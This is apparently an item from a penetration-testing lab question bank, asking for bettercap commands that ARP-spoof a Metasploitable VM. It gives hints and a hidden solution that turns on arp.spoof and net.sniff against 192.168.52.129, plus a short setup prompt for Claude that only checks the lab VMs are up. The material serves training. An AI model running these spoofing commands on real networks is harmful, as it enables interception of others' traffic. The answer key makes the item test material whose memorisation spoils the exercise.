# Q129 — bettercap ARP Spoof

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` / pcap |
| **Domain** | 07 — Sniffing / 14 — Wireless |
| **Difficulty** | 🟡 Medium |
| **Tools** | `tcpdump`, `wireshark`, `ettercap`, `bettercap`, `aircrack-ng` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use bettercap to ARP-spoof Metasploitable. Provide commands inside bettercap shell.

---

## 🎯 Flag Format

```
cmds=<text>
```

Example: `cmds=set arp.spoof.targets 192.168.52.129; arp.spoof on; net.sniff on`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Caplet syntax.
</details>

<details>
<summary>Hint 2</summary>

Run with `sudo bettercap -iface eth0`.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.52.129
> arp.spoof on
> net.sniff on
```

Sniffs MITM traffic.

**Answer:** `cmds=set arp.spoof.targets 192.168.52.129; arp.spoof on; net.sniff on`

📖 Ref: [tools/bettercap.md](../../tools/bettercap.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q129".
```
